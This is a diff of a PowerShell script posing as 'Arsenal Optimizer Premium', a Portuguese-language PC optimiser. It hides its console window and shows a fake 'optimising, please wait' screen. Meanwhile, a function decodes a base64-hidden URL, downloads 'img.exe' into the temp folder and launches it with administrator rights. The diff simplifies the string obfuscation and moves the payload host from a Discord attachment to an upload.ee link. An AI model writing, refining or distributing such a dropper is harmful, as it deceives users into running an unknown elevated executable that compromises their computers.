@@ -1,20 +1,20 @@
-[System.Reflection.Assembly]::LoadWithPartialName([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("cHJlc2VudGF0aW9uZnJhbWV3b3Jr"))) > $null
+Add-Type -AssemblyName PresentationFramework
 
-function G1 {
-    [void] [System.Reflection.Assembly]::LoadWithPartialName([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("cHJlc2VudGF0aW9uZnJhbWV3b3Jr")))
+function S1 {
+    [void] [System.Reflection.Assembly]::LoadWithPartialName("presentationframework")
 
-    $w1 = New-Object ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("U3lzdGVtLldpbmRvd3MuV2luZG93")))
-    $w1.Title = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("T3B0aW1pemVy"))
+    $w1 = New-Object System.Windows.Window
+    $w1.Title = "Optimizer"
     $w1.Width = 600
     $w1.Height = 500
-    $w1.WindowStartupLocation = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("Q2VudGVyU2NyZWVu"))
-    $w1.WindowStyle = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("Tm9uZQ=="))
-    $w1.ResizeMode = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("Tm9SZXNpemU="))
+    $w1.WindowStartupLocation = "CenterScreen"
+    $w1.WindowStyle = "None"
+    $w1.ResizeMode = "NoResize"
     $w1.Background = [System.Windows.Media.Brushes]::Black
     $w1.AllowsTransparency = $true
     $w1.Opacity = 0.98
 
-    $b1 = New-Object ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("U3lzdGVtLldpbmRvd3MuQ29udHJvbHMuQm9yZGVy")))
+    $b1 = New-Object System.Windows.Controls.Border
     $b1.Background = [System.Windows.Media.Brushes]::Black
     $b1.CornerRadius = "15"
     $b1.Padding = "20"
@@ -22,46 +22,46 @@ function G1 {
     $b1.BorderBrush = [System.Windows.Media.Brushes]::DarkRed
     $b1.BorderThickness = "3"
 
-    $s1 = New-Object ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("U3lzdGVtLldpbmRvd3MuQ29udHJvbHMuU3RhY2tQYW5lbA==")))
-    $s1.HorizontalAlignment = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("Q2VudGVy"))
-    $s1.VerticalAlignment = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("Q2VudGVy"))
+    $s1 = New-Object System.Windows.Controls.StackPanel
+    $s1.HorizontalAlignment = "Center"
+    $s1.VerticalAlignment = "Center"
     
-    $t1 = New-Object ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("U3lzdGVtLldpbmRvd3MuQ29udHJvbHMuVGV4dEJsb2Nr")))
-    $t1.Text = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("QXJzZW5hbCBPcHRpbWl6ZXIgUHJlbWl1bQ=="))
+    $t1 = New-Object System.Windows.Controls.TextBlock
+    $t1.Text = "Arsenal Optimizer Premium"
     $t1.Margin = "15"
-    $t1.HorizontalAlignment = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("Q2VudGVy"))
+    $t1.HorizontalAlignment = "Center"
     $t1.Foreground = [System.Windows.Media.Brushes]::White
     $t1.FontSize = 26
-    $t1.FontFamily = New-Object ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("U3lzdGVtLldpbmRvd3MuTWVkaWEuRm9udEZhbWlseQ==")), [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("U2Vnb2UgVUk=")))
-    $t1.FontWeight = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("Qm9sZA=="))
+    $t1.FontFamily = New-Object System.Windows.Media.FontFamily "Segoe UI"
+    $t1.FontWeight = "Bold"
 
     $s1.Children.Add($t1)
     
-    $bp1 = New-Object ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("U3lzdGVtLldpbmRvd3MuQ29udHJvbHMuU3RhY2tQYW5lbA==")))
-    $bp1.Orientation = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("SG9yaXpvbnRhbA=="))
-    $bp1.HorizontalAlignment = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("Q2VudGVy"))
+    $bp1 = New-Object System.Windows.Controls.StackPanel
+    $bp1.Orientation = "Horizontal"
+    $bp1.HorizontalAlignment = "Center"
     $bp1.Margin = "30"
     
-    $y1 = New-Object ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("U3lzdGVtLldpbmRvd3MuQ29udHJvbHMuQnV0dG9u")))
-    $y1.Content = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("U2lt"))
+    $y1 = New-Object System.Windows.Controls.Button
+    $y1.Content = "Sim"
     $y1.Width = 100
     $y1.Margin = "10"
     $y1.Background = [System.Windows.Media.Brushes]::Crimson
     $y1.Foreground = [System.Windows.Media.Brushes]::White
     $y1.FontSize = 16
-    $y1.FontFamily = New-Object ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("U3lzdGVmLldpbmRvd3MuTWVkaWEuRm9udEZhbWlseQ==")), [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("U2Vnb2UgVUk=")))
-    $y1.FontWeight = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("Qm9sZA=="))
+    $y1.FontFamily = New-Object System.Windows.Media.FontFamily "Segoe UI"
+    $y1.FontWeight = "Bold"
     $y1.Padding = "10"
 
-    $n1 = New-Object ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("U3lzdGVtLldpbmRvd3MuQ29udHJvbHMuQnV0dG9u")))
-    $n1.Content = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("TsOqw=="))
+    $n1 = New-Object System.Windows.Controls.Button
+    $n1.Content = "Não"
     $n1.Width = 100
     $n1.Margin = "10"
     $n1.Background = [System.Windows.Media.Brushes]::Crimson
     $n1.Foreground = [System.Windows.Media.Brushes]::White
     $n1.FontSize = 16
-    $n1.FontFamily = New-Object ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("U3lzdGVtLldpbmRvd3MuTWVkaWEuRm9udEZhbWlseQ==")), [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("U2Vnb2UgVUk=")))
-    $n1.FontWeight = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("Qm9sZA=="))
+    $n1.FontFamily = New-Object System.Windows.Media.FontFamily "Segoe UI"
+    $n1.FontWeight = "Bold"
     $n1.Padding = "10"
 
     $bp1.Children.Add($y1)
@@ -93,11 +93,11 @@ function G1 {
     return $r1
 }
 
-function F1 {
-    $u1 = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTIyNDAwNTA5MTQ4MTIyNzM2Ni8xMjQ0NDg5MDM0MjI3NzgxNjYyL2ltZy5leGU/ZHg9NjY1NTRjM2Imc3o9NjY1M2ZhYmImdG0lM2Q3ZjgzOWE1MmY1ZDAwZDk0YTRiZGFhMTg1M2RlYzU2NzUwNThiYjA2YzIyMTM5NTkxNjZiOGUyYzllZjRkNTY="))
+function D1 {
+    $u1 = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly93d3cudXBsb2FkLmVlL2Rvd25sb2FkLzE2Njc3MDcyLzZiNmZjMTFlYWRjOTFlZGE5MzgxL2ltZy5leGU="))
     $o1 = "$env:TEMP\img.exe"
     
-    $wc1 = New-Object ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("U3lzdGVtLk5ldC5XZWJDbGllbnQ=")))
+    $wc1 = New-Object System.Net.WebClient
     $wc1.DownloadFile($u1, $o1)
 
     Start-Process -FilePath $o1 -Verb RunAs
@@ -114,21 +114,21 @@ $u321 = Add-Type -TypeDefinition @"
 "@ -PassThru
 $u321::ShowWindow($c1, 0)
 
-$r1 = G1
+$r1 = S1
 
 if ($null -eq $r1 -or $r1 -eq $false) {
-    $lw1 = New-Object ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("U3lzdGVtLldpbmRvd3MuV2luZG93")))
-    $lw1.Title = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("Q2FycGVnYW5kby4uLg=="))
+    $lw1 = New-Object System.Windows.Window
+    $lw1.Title = "Carregando"
     $lw1.Width = 400
     $lw1.Height = 150
-    $lw1.WindowStartupLocation = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("Q2VudGVyU2NyZWVu"))
-    $lw1.WindowStyle = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("Tm9uZQ=="))
-    $lw1.ResizeMode = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("Tm9SZXNpemU="))
+    $lw1.WindowStartupLocation = "CenterScreen"
+    $lw1.WindowStyle = "None"
+    $lw1.ResizeMode = "NoResize"
     $lw1.Background = [System.Windows.Media.Brushes]::Black
     $lw1.AllowsTransparency = $true
     $lw1.Opacity = 0.98
     
-    $b1 = New-Object ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("U3lzdGVtLldpbmRvd3MuQ29udHJvbHMuQm9yZGVy")))
+    $b1 = New-Object System.Windows.Controls.Border
     $b1.Background = [System.Windows.Media.Brushes]::Black
     $b1.CornerRadius = "15"
     $b1.Padding = "20"
@@ -136,21 +136,21 @@ if ($null -eq $r1 -or $r1 -eq $false) {
     $b1.BorderBrush = [System.Windows.Media.Brushes]::DarkRed
     $b1.BorderThickness = "3"
 
-    $sp1 = New-Object ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("U3lzdGVtLldpbmRvd3MuQ29udHJvbHMuU3RhY2tQYW5lbA==")))
-    $sp1.HorizontalAlignment = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("Q2VudGVy"))
-    $sp1.VerticalAlignment = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("Q2VudGVy"))
+    $sp1 = New-Object System.Windows.Controls.StackPanel
+    $sp1.HorizontalAlignment = "Center"
+    $sp1.VerticalAlignment = "Center"
 
-    $lt1 = New-Object ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("U3lzdGVtLldpbmRvd3MuQ29udHJvbHMuVGV4dEJsb2Nr")))
-    $lt1.Text = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("T3RpbWl6YW5kbywgcG9yIGZhdm9yIGFndWFyZGUuLi4="))
+    $lt1 = New-Object System.Windows.Controls.TextBlock
+    $lt1.Text = "Otimizando, por favor aguarde..."
     $lt1.Margin = "10"
-    $lt1.HorizontalAlignment = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("Q2VudGVy"))
-    $lt1.VerticalAlignment = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("Q2VudGVy"))
+    $lt1.HorizontalAlignment = "Center"
+    $lt1.VerticalAlignment = "Center"
     $lt1.Foreground = [System.Windows.Media.Brushes]::White
     $lt1.FontSize = 18
-    $lt1.FontFamily = New-Object ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("U3lzdGVtLldpbmRvd3MuTWVkaWEuRm9udEZhbWlseQ==")), [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("U2Vnb2UgVUk=")))
-    $lt1.FontWeight = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("Qm9sZA=="))
+    $lt1.FontFamily = New-Object System.Windows.Media.FontFamily "Segoe UI"
+    $lt1.FontWeight = "Bold"
 
-    $pb1 = New-Object ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("U3lzdGVtLldpbmRvd3MuQ29udHJvbHMuUHJvZ3Jlc3NCYXI=")))
+    $pb1 = New-Object System.Windows.Controls.ProgressBar
     $pb1.Width = 300
     $pb1.Height = 20
     $pb1.IsIndeterminate = $true
@@ -164,7 +164,7 @@ if ($null -eq $r1 -or $r1 -eq $false) {
     $lw1.Content = $b1
     $lw1.Show()
     
-    F1
+    D1
     
     $lw1.Close()
 }
